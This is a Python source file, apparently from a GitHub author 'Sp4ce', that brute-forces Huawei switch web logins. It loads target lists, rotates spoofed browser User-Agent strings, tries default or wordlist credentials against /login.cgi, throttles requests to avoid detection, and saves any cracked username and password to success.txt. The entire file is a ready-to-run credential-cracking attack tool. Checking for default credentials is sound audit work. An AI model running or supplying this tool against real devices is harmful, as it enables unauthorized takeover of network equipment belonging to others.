'''
@Description: 
@Author: Sp4ce
@Github: https://github.com/NS-Sp4ce
@Date: 2019-10-28 23:05:39
@LastEditors: Sp4ce
@LastEditTime: 2019-10-29 00:00:09
'''
import argparse
import time
from random import choice
import requests
import urllib3
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
]
TIME_OUT = 10
# 默认用户字典
USERNAME_LIST = ['admin', 'huawei']
# 默认密码字典
PASSWORD_LIST = ['huawei@1234', 'Huawei@1234']

PAYLOAD = 'UserName={0}&Password={1}&Edition=0'
headers = {}


def checkTargetAlive(url):
    print('[i] Check {0} is alive.'.format(url))
    headers["User-Agent"] = choice(USER_AGENTS)
    try:
        res = requests.get(
            url, headers=headers, verify=False, timeout=TIME_OUT)
        if res.status_code == 200:
            print('[+] Target {0} is alive.'.format(url))
            return True
        else:
            print('[-] Target {0} is dead.'.format(url))
            return False
    except:
        print('[-] Something Wrong With {0}.'.format(url))
        return False


def crackSwitch(url):
    url = url + '/login.cgi'
    for userName in USERNAME_LIST:
        for userPass in PASSWORD_LIST:
            print('[i] Testing {0} {1} for target {2}'.format(
                userName, userPass, url))
            headers["User-Agent"] = choice(USER_AGENTS)
            headers["Content-Type"] = 'application/x-www-form-urlencoded'
            res = requests.post(
                url,
                headers=headers,
                data=PAYLOAD.format(userName, userPass),
                verify=False)
            if 'Location' in str(res.content):
                print(
                    '[+] Cracked {0} Success， Username=> {1}  Password=> {2}'.
                    format(url, userName, userPass))
                with open('success.txt', 'a+') as sucFile:
                    sucFile.write(
                        'target: {0} username: {1} password: {2} \n'.format(
                            url, userName, userPass))
                return True
            else:
                # 防止频繁请求导致bad request
                time.sleep(1.5)


if __name__ == "__main__":
    urls = []
    print(r"""
  _    _                          _    _____         _ _       _        _____                _    
 | |  | |                        (_)  / ____|       (_) |     | |      / ____|              | |   
 | |__| |_   _  __ ___      _____ _  | (_____      ___| |_ ___| |__   | |     _ __ __ _  ___| | __
 |  __  | | | |/ _` \ \ /\ / / _ \ |  \___ \ \ /\ / / | __/ __| '_ \  | |    | '__/ _` |/ __| |/ /
 | |  | | |_| | (_| |\ V  V /  __/ |  ____) \ V  V /| | || (__| | | | | |____| | | (_| | (__|   < 
 |_|  |_|\__,_|\__,_| \_/\_/ \___|_| |_____/ \_/\_/ |_|\__\___|_| |_|  \_____|_|  \__,_|\___|_|\_\

                                        By:Sp4ce
    """)
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-target",
        "--targetfile",
        type=str,
        help="Load targets file or single target.")
    parser.add_argument(
        "-unamefile",
        "--usernamefile",
        type=str,
        help=
        "Use custom username file, if param is none, use default username list."
    )
    parser.add_argument(
        "-pwdfile",
        "--passwordfile",
        type=str,
        help=
        "Use custom password file, if param is none, use default password list."
    )

    args = parser.parse_args()
    if args.targetfile:
        '''
        检查目标是否为文件
        '''
        if os.path.isfile(args.targetfile):
            with open(args.targetfile) as target:
                urls = target.read().splitlines()
        else:
            urls.append(args.targetfile)
        '''
        检查是否导入了用户名字典
        '''
        if args.usernamefile is not None and os.path.isfile(args.usernamefile):
            with open(args.usernamefile) as username:
                USERNAME_LIST = username.read().splitlines()
        else:
            USERNAME_LIST = USERNAME_LIST
        '''
        检查是否导入了密码字典
        '''
        if args.passwordfile is not None and os.path.isfile(args.passwordfile):
            with open(args.passwordfile) as password:
                PASSWORD_LIST = password.read().splitlines()
        else:
            PASSWORD_LIST = PASSWORD_LIST

        print(
            '[i] Load {0} Username(s) and {1} Password(s) For Test {2} Target(s).'
            .format(len(USERNAME_LIST), len(PASSWORD_LIST), len(urls)))
        for url in urls:
            if checkTargetAlive(url):
                crackSwitch(url)
        print('[i] All Test Was Down.')
    else:
        parser.print_help()
